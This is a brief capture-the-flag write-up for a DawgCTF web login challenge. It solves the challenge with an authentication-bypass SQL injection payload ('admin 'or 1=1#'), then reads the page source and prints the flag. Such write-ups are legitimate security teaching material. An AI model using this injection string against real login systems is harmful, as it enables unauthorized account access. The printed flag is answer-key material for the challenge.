# Dr. Hrabowski's Great Adventure (150)

### Description
> President Freeman Hrabowski is having a relaxing evening in Downtown Baltimore. But he forgot his password to give all UMBC students an A in all their classes this semester! Find a way to log in and help him out. (If you get an SSL error, try a different browser)

### Connection
http://umbccd.io:6100

### Solution
1. SQL injection
    ```sql
    username = admin 'or 1=1#
    password = <anything>
    ```
    ![](./images/login.png)
2. Click the button, an image appears, Trace the source code and find out the flag\
    ![](./images/flag.png)

### Flag
```
DawgCTF{WeLoveTrueGrit}
```